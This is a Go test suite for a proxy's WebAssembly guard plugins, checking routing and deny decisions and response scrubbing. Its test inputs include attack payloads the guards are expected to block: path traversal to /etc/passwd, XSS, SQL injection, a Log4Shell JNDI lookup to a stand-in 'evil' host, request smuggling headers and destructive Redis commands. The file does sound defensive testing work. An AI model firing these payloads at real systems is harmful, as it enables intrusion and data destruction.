package plugin

import (
	"bytes"
	"context"
	"net"
	"testing"
)

// The example plugins under plugins/examples are built from Rust sources and
// committed as .wasm. These tests load the real artifacts, so a broken build
// or an ABI drift fails CI without requiring a Rust toolchain.

func loadExample(t *testing.T, path string) *Plugin {
	t.Helper()
	p, err := LoadFile(context.Background(), path, Options{})
	if err != nil {
		t.Fatalf("LoadFile(%s): %v", path, err)
	}
	t.Cleanup(func() { _ = p.Close(context.Background()) })
	return p
}

func TestExamplePluginsLoad(t *testing.T) {
	tests := []struct {
		name   string
		path   string
		data   bool
		state  bool
		accept bool
	}{
		{"ipguard", "../../plugins/examples/ipguard/ipguard.wasm", false, false, true},
		{"http_guard", "../../plugins/examples/http_guard/http_guard.wasm", true, false, false},
		{"http_body_guard", "../../plugins/examples/http_body_guard/http_body_guard.wasm", true, true, false},
		{"path_router", "../../plugins/examples/path_router/path_router.wasm", true, false, false},
		{"sni_guard", "../../plugins/examples/sni_guard/sni_guard.wasm", true, false, false},
		{"protocol_router", "../../plugins/examples/protocol_router/protocol_router.wasm", true, false, false},
		{"redis_guard", "../../plugins/examples/redis_guard/redis_guard.wasm", true, false, false},
		{"stream_guard", "../../plugins/examples/stream_guard/stream_guard.wasm", true, false, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			p := loadExample(t, tt.path)
			if got := p.HasData(); got != tt.data {
				t.Fatalf("HasData() = %v, want %v", got, tt.data)
			}
			if got := p.HasState(); got != tt.state {
				t.Fatalf("HasState() = %v, want %v", got, tt.state)
			}
			// Modules without on_accept must be transparent on that hook.
			if v, err := p.OnAccept(context.Background(), net.ParseIP("192.0.2.10"), 1234); err != nil || v != VerdictAllow {
				t.Fatalf("OnAccept() = (%v, %v), want (allow, nil)", v, err)
			}
		})
	}
}

func TestExamplePathRouter(t *testing.T) {
	p := loadExample(t, "../../plugins/examples/path_router/path_router.wasm")
	ctx := context.Background()
	tests := []struct {
		name    string
		payload string
		want    Verdict
	}{
		{
			"host api",
			"GET /v1/users HTTP/1.1\r\nHost: api.example.com:8443\r\n\r\n",
			2,
		},
		{
			"path api",
			"GET /api/users HTTP/1.1\r\nHost: example.com\r\n\r\n",
			2,
		},
		{
			"path static",
			"GET /assets/app.js HTTP/1.1\r\nHost: example.com\r\n\r\n",
			3,
		},
		{
			"websocket host",
			"GET /chat HTTP/1.1\r\nHost: ws.example.com\r\nUpgrade: websocket\r\n\r\n",
			4,
		},
		{
			"health is default",
			"GET /healthz HTTP/1.1\r\nHost: example.com\r\n\r\n",
			VerdictAllow,
		},
		{
			"admin denied",
			"GET /admin/users HTTP/1.1\r\nHost: example.com\r\n\r\n",
			VerdictDeny,
		},
		{
			"traversal denied",
			"GET /static/../etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n",
			VerdictDeny,
		},
		{
			"non-http defaults",
			"\x05hello",
			VerdictAllow,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			buf := []byte(tt.payload)
			got, err := p.OnDataConn(ctx, 1, 0, buf)
			if err != nil {
				t.Fatalf("OnDataConn: %v", err)
			}
			if got != tt.want {
				t.Fatalf("verdict = %d, want %d", got, tt.want)
			}
		})
	}
}

func TestExampleSNIGuard(t *testing.T) {
	p := loadExample(t, "../../plugins/examples/sni_guard/sni_guard.wasm")
	ctx := context.Background()
	tests := []struct {
		name   string
		record []byte
		want   Verdict
	}{
		{"api route", buildExampleClientHello("api.example.com"), 2},
		{"static route", buildExampleClientHello("static.example.com"), 3},
		{"internal route", buildExampleClientHello("db.internal.example.com"), 4},
		{"default", buildExampleClientHello("example.org"), VerdictAllow},
		{"blocked", buildExampleClientHello("malware.test"), VerdictDeny},
		{"blocked subdomain", buildExampleClientHello("cdn.blocked.example.com"), VerdictDeny},
		{"not tls", []byte("GET / HTTP/1.1\r\n"), VerdictAllow},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := p.OnDataConn(ctx, 1, 0, tt.record)
			if err != nil {
				t.Fatalf("OnDataConn: %v", err)
			}
			if got != tt.want {
				t.Fatalf("verdict = %d, want %d", got, tt.want)
			}
		})
	}
}

func TestExampleProtocolRouter(t *testing.T) {
	p := loadExample(t, "../../plugins/examples/protocol_router/protocol_router.wasm")
	ctx := context.Background()
	pgStartup := []byte{0x00, 0x00, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00}
	tests := []struct {
		name    string
		payload []byte
		want    Verdict
	}{
		{"tls", buildExampleClientHello("example.com"), 2},
		{"http", []byte("POST /rpc HTTP/1.1\r\nHost: x\r\n\r\n"), 3},
		{"ssh", []byte("SSH-2.0-OpenSSH_9.6\r\n"), 4},
		{"postgres", pgStartup, 5},
		{"redis", []byte("*1\r\n$4\r\nPING\r\n"), 6},
		{"unknown denied", []byte("\x00\x01\x02\x03"), VerdictDeny},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := p.OnDataConn(ctx, 1, 0, tt.payload)
			if err != nil {
				t.Fatalf("OnDataConn: %v", err)
			}
			if got != tt.want {
				t.Fatalf("verdict = %d, want %d", got, tt.want)
			}
		})
	}
}

func TestExampleHTTPGuard(t *testing.T) {
	p := loadExample(t, "../../plugins/examples/http_guard/http_guard.wasm")
	ctx := context.Background()
	const auth = "Authorization: Basic dXNlcjpwYXNz\r\n"
	tests := []struct {
		name    string
		payload string
		want    Verdict
	}{
		{
			"valid request",
			"GET /index.html HTTP/1.1\r\nHost: example.com\r\n" + auth + "\r\n",
			VerdictAllow,
		},
		{"missing auth", "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n", VerdictDeny},
		{"trace denied", "TRACE / HTTP/1.1\r\nHost: example.com\r\n" + auth + "\r\n", VerdictDeny},
		{"admin path", "GET /admin HTTP/1.1\r\nHost: example.com\r\n" + auth + "\r\n", VerdictDeny},
		{"traversal", "GET /a/../b HTTP/1.1\r\nHost: example.com\r\n" + auth + "\r\n", VerdictDeny},
		{"missing host", "GET / HTTP/1.1\r\n" + auth + "\r\n", VerdictDeny},
		{"duplicate content-length", "POST / HTTP/1.1\r\nHost: example.com\r\n" + auth +
			"Content-Length: 1\r\nContent-Length: 2\r\n\r\nx", VerdictDeny},
		{"cl and te", "POST / HTTP/1.1\r\nHost: example.com\r\n" + auth +
			"Content-Length: 1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", VerdictDeny},
		{"scanner ua", "GET / HTTP/1.1\r\nHost: example.com\r\n" + auth +
			"User-Agent: sqlmap/1.7\r\n\r\n", VerdictDeny},
		{"non-http passes", "PING\r\n", VerdictAllow},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := p.OnDataConn(ctx, 1, 0, []byte(tt.payload))
			if err != nil {
				t.Fatalf("OnDataConn: %v", err)
			}
			if got != tt.want {
				t.Fatalf("verdict = %d, want %d", got, tt.want)
			}
		})
	}

	// The response direction is mutated in place; the chunk length must not
	// change, so the host can copy it straight back to the socket.
	resp := []byte("HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nX-Powered-By: PHP/8.2.1\r\nContent-Length: 0\r\n\r\n")
	origLen := len(resp)
	got, err := p.OnDataConn(ctx, 1, 1, resp)
	if err != nil || got != VerdictAllow {
		t.Fatalf("OnDataConn(response) = (%d, %v), want (allow, nil)", got, err)
	}
	if len(resp) != origLen {
		t.Fatalf("response length changed: %d -> %d", origLen, len(resp))
	}
	if !bytes.Contains(resp, []byte("Server: wasmgate")) {
		t.Fatalf("Server header not masked: %q", resp)
	}
	if !bytes.Contains(resp, []byte("X-Powered-By: hidden")) {
		t.Fatalf("X-Powered-By header not masked: %q", resp)
	}
}

func TestExampleRedisGuard(t *testing.T) {
	p := loadExample(t, "../../plugins/examples/redis_guard/redis_guard.wasm")
	ctx := context.Background()
	tests := []struct {
		name    string
		payload string
		want    Verdict
	}{
		{"get", "*2\r\n$3\r\nGET\r\n$3\r\nfoo\r\n", VerdictAllow},
		{"set", "*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nvalue\r\n", VerdictAllow},
		{"inline ping", "PING\r\n", VerdictAllow},
		{"partial fails open", "*2\r\n$3\r\nGE", VerdictAllow},
		{"flushall denied", "*1\r\n$8\r\nFLUSHALL\r\n", VerdictDeny},
		{"config denied", "*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$4\r\nsave\r\n", VerdictDeny},
		{"eval denied", "*3\r\n$4\r\nEVAL\r\n$1\r\n*\r\n$1\r\n0\r\n", VerdictDeny},
		{"client kill denied", "*2\r\n$6\r\nCLIENT\r\n$4\r\nKILL\r\n", VerdictDeny},
		{"client id allowed", "*2\r\n$6\r\nCLIENT\r\n$2\r\nID\r\n", VerdictAllow},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := p.OnDataConn(ctx, 1, 0, []byte(tt.payload))
			if err != nil {
				t.Fatalf("OnDataConn: %v", err)
			}
			if got != tt.want {
				t.Fatalf("verdict = %d, want %d", got, tt.want)
			}
		})
	}

	// Server replies are ignored even when they look like denied commands.
	if got, err := p.OnDataConn(ctx, 1, 1, []byte("*1\r\n$8\r\nFLUSHALL\r\n")); err != nil || got != VerdictAllow {
		t.Fatalf("response direction = (%d, %v), want (allow, nil)", got, err)
	}
}

func TestExampleStreamGuard(t *testing.T) {
	p := loadExample(t, "../../plugins/examples/stream_guard/stream_guard.wasm")
	ctx := context.Background()
	tests := []struct {
		name    string
		payload string
		want    Verdict
	}{
		{"clean request", "POST /login HTTP/1.1\r\nHost: example.com\r\n\r\nuser=alice", VerdictAllow},
		{"body xss", "POST /c HTTP/1.1\r\nHost: x\r\n\r\n<script>alert(1)</script>", VerdictDeny},
		{"body sqli", "POST /q HTTP/1.1\r\nHost: x\r\n\r\nid=1 UNION SELECT password FROM users", VerdictDeny},
		{"body traversal", "GET /?f=../../etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n", VerdictDeny},
		{"log4shell", "GET / HTTP/1.1\r\nHost: x\r\nX-Api: ${jndi:ldap://evil/a}\r\n\r\n", VerdictDeny},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := p.OnDataConn(ctx, 1, 0, []byte(tt.payload))
			if err != nil {
				t.Fatalf("OnDataConn: %v", err)
			}
			if got != tt.want {
				t.Fatalf("verdict = %d, want %d", got, tt.want)
			}
		})
	}

	resp := []byte("HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/json\r\n\r\n" +
		`{"user":"alice","password":"hunter2","access_token":"s3cr3t","ok":true}`)
	origLen := len(resp)
	got, err := p.OnDataConn(ctx, 1, 1, resp)
	if err != nil || got != VerdictAllow {
		t.Fatalf("OnDataConn(response) = (%d, %v), want (allow, nil)", got, err)
	}
	if len(resp) != origLen {
		t.Fatalf("response length changed: %d -> %d", origLen, len(resp))
	}
	for _, leaked := range []string{"hunter2", "s3cr3t", "nginx/1.25.3"} {
		if bytes.Contains(resp, []byte(leaked)) {
			t.Fatalf("%q leaked after scrubbing: %q", leaked, resp)
		}
	}
	if !bytes.Contains(resp, []byte(`"password":"*******"`)) {
		t.Fatalf("password not masked: %q", resp)
	}
	if !bytes.Contains(resp, []byte(`"user":"alice"`)) {
		t.Fatalf("non-secret JSON was modified: %q", resp)
	}
}

func TestExampleHTTPBodyGuard(t *testing.T) {
	p := loadExample(t, "../../plugins/examples/http_body_guard/http_body_guard.wasm")
	ctx := context.Background()

	t.Run("fragmented headers and body across chunks", func(t *testing.T) {
		cs := AcquireConnState()
		defer ReleaseConnState(cs)

		chunks := []string{
			"POST /api/items HTTP/1.1\r\nHost: ex",
			"ample.com\r\nContent-Length: 11\r",
			"\n\r\nhello ",
			"world",
		}
		for i, ch := range chunks {
			got, err := p.OnDataState(ctx, 10, 0, []byte(ch), cs.Dir(0))
			if err != nil || got != VerdictAllow {
				t.Fatalf("chunk %d: got (%d, %v), want (allow, nil)", i, got, err)
			}
		}
		if len(cs.Dir(0).Bytes()) != 36 {
			t.Fatalf("post-request state len = %d, want 36", len(cs.Dir(0).Bytes()))
		}
	})

	t.Run("fragmented headers cannot bypass policy", func(t *testing.T) {
		cs := AcquireConnState()
		defer ReleaseConnState(cs)

		if got, err := p.OnDataState(ctx, 11, 0, []byte("GET /adm"), cs.Dir(0)); err != nil || got != VerdictAllow {
			t.Fatalf("chunk 0 = (%d, %v), want (allow, nil)", got, err)
		}
		if got, err := p.OnDataState(ctx, 11, 0, []byte("in/panel HTTP/1.1\r\nHost: example.com\r\n\r\n"), cs.Dir(0)); err != nil || got != VerdictDeny {
			t.Fatalf("chunk 1 = (%d, %v), want (deny, nil)", got, err)
		}
	})

	t.Run("cross-chunk body signature caught via rolling tail", func(t *testing.T) {
		cs := AcquireConnState()
		defer ReleaseConnState(cs)

		c1 := "POST /search HTTP/1.1\r\nHost: example.com\r\nContent-Length: 27\r\n\r\nq=test union "
		c2 := "select * from t"
		if got, err := p.OnDataState(ctx, 12, 0, []byte(c1), cs.Dir(0)); err != nil || got != VerdictAllow {
			t.Fatalf("chunk 1 = (%d, %v), want (allow, nil)", got, err)
		}
		if got, err := p.OnDataState(ctx, 12, 0, []byte(c2), cs.Dir(0)); err != nil || got != VerdictDeny {
			t.Fatalf("chunk 2 = (%d, %v), want (deny, nil) on split signature", got, err)
		}
	})

	t.Run("state preserved between keep-alive requests without cross-conn leak", func(t *testing.T) {
		cs1 := AcquireConnState()
		defer ReleaseConnState(cs1)
		cs2 := AcquireConnState()
		defer ReleaseConnState(cs2)

		req := []byte("POST /echo HTTP/1.1\r\nHost: example.com\r\nContent-Length: 4\r\n\r\npong")
		for i := 1; i <= 5; i++ {
			got, err := p.OnDataState(ctx, 21, 0, req, cs1.Dir(0))
			if err != nil || got != VerdictAllow {
				t.Fatalf("conn1 request %d: got (%d, %v), want (allow, nil)", i, got, err)
			}
		}
		// 6th request on conn1 exceeds MAX_REQUESTS_PER_CONN (5).
		if got, err := p.OnDataState(ctx, 21, 0, req, cs1.Dir(0)); err != nil || got != VerdictDeny {
			t.Fatalf("conn1 request 6: got (%d, %v), want (deny, nil)", got, err)
		}

		// Independent connection cs2 sharing the same pooled WASM instance must
		// not inherit conn1's request counter.
		if got, err := p.OnDataState(ctx, 22, 0, req, cs2.Dir(0)); err != nil || got != VerdictAllow {
			t.Fatalf("conn2 request 1: got (%d, %v), want (allow, nil)", got, err)
		}
	})

	t.Run("cumulative body budget enforced across requests", func(t *testing.T) {
		cs := AcquireConnState()
		defer ReleaseConnState(cs)

		body60k := bytes.Repeat([]byte("a"), 30000)
		hdr60k := []byte("POST /upload HTTP/1.1\r\nHost: example.com\r\nContent-Length: 60000\r\n\r\n")
		for reqIdx := 1; reqIdx <= 2; reqIdx++ {
			if got, err := p.OnDataState(ctx, 30, 0, hdr60k, cs.Dir(0)); err != nil || got != VerdictAllow {
				t.Fatalf("req %d header: got (%d, %v)", reqIdx, got, err)
			}
			for part := 0; part < 2; part++ {
				if got, err := p.OnDataState(ctx, 30, 0, body60k, cs.Dir(0)); err != nil || got != VerdictAllow {
					t.Fatalf("req %d body part %d: got (%d, %v)", reqIdx, part, got, err)
				}
			}
		}
		// 3rd request declares another 20,000 bytes (total 140,000 > 128 KiB limit).
		hdr20k := []byte("POST /upload HTTP/1.1\r\nHost: example.com\r\nContent-Length: 20000\r\n\r\n")
		if got, err := p.OnDataState(ctx, 30, 0, hdr20k, cs.Dir(0)); err != nil || got != VerdictDeny {
			t.Fatalf("req 3 exceeding conn body budget: got (%d, %v), want (deny, nil)", got, err)
		}
	})

	t.Run("response scrubbing uses independent dir 1 state", func(t *testing.T) {
		cs := AcquireConnState()
		defer ReleaseConnState(cs)

		resp := []byte("HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/json\r\n\r\n" +
			`{"user":"bob","password":"secret!","access_token":"tok123"}`)
		got, err := p.OnDataState(ctx, 40, 1, resp, cs.Dir(1))
		if err != nil || got != VerdictAllow {
			t.Fatalf("OnDataState(dir=1) = (%d, %v), want (allow, nil)", got, err)
		}
		if !bytes.Contains(resp, []byte(`"password":"*******"`)) || !bytes.Contains(resp, []byte("Server: wasmgate")) {
			t.Fatalf("response not scrubbed: %q", resp)
		}
		if len(cs.Dir(0).Bytes()) != 0 {
			t.Fatalf("dir 0 state was modified by dir 1 call: len=%d", len(cs.Dir(0).Bytes()))
		}
	})
}

func BenchmarkExampleHTTPBodyGuard(b *testing.B) {
	ctx := context.Background()
	p, err := LoadFile(ctx, "../../plugins/examples/http_body_guard/http_body_guard.wasm", Options{})
	if err != nil {
		b.Fatalf("LoadFile: %v", err)
	}
	defer p.Close(ctx)

	cs := AcquireConnState()
	defer ReleaseConnState(cs)
	payload := []byte("POST /api/login HTTP/1.1\r\nHost: example.com\r\nContent-Length: 16\r\n\r\n{\"user\":\"alice\"}")
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cs.Dir(0).Reset()
		v, err := p.OnDataState(ctx, 1, 0, payload, cs.Dir(0))
		if err != nil || v != VerdictAllow {
			b.Fatalf("OnDataState: %v, %v", v, err)
		}
	}
}

// buildExampleClientHello builds a minimal TLS 1.2 ClientHello with an SNI
// extension, mirroring internal/tlspeek's test fixture.
func buildExampleClientHello(sni string) []byte {
	host := []byte(sni)
	sniExtData := make([]byte, 2+1+2+len(host))
	listLen := 1 + 2 + len(host)
	sniExtData[0] = byte(listLen >> 8)
	sniExtData[1] = byte(listLen)
	sniExtData[2] = 0x00
	sniExtData[3] = byte(len(host) >> 8)
	sniExtData[4] = byte(len(host))
	copy(sniExtData[5:], host)

	ext := make([]byte, 4+len(sniExtData))
	ext[2] = byte(len(sniExtData) >> 8)
	ext[3] = byte(len(sniExtData))
	copy(ext[4:], sniExtData)

	ch := make([]byte, 0, 64+len(ext))
	ch = append(ch, 0x03, 0x03)
	ch = append(ch, make([]byte, 32)...)
	ch = append(ch, 0x00)
	ch = append(ch, 0x00, 0x02, 0x00, 0x2f)
	ch = append(ch, 0x01, 0x00)
	ch = append(ch, byte(len(ext)>>8), byte(len(ext)))
	ch = append(ch, ext...)

	hs := make([]byte, 4+len(ch))
	hs[0] = 0x01
	hs[1] = byte(len(ch) >> 16)
	hs[2] = byte(len(ch) >> 8)
	hs[3] = byte(len(ch))
	copy(hs[4:], ch)

	rec := make([]byte, 5+len(hs))
	rec[0] = 0x16
	rec[1] = 0x03
	rec[2] = 0x01
	rec[3] = byte(len(hs) >> 8)
	rec[4] = byte(len(hs))
	copy(rec[5:], hs)
	return rec
}
